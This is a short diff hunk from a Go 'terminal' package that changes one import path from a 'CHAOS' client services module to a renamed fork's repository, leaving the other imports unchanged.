@@ -2,7 +2,7 @@ package terminal
 
 import (
 	"context"
-	"github.com/tiagorlampert/CHAOS/client/app/services"
+	"github.com/youtrolledhahaha/XDTROLLEDAxzxx/client/app/services"
 	"os/exec"
 	"runtime"
 	"time"
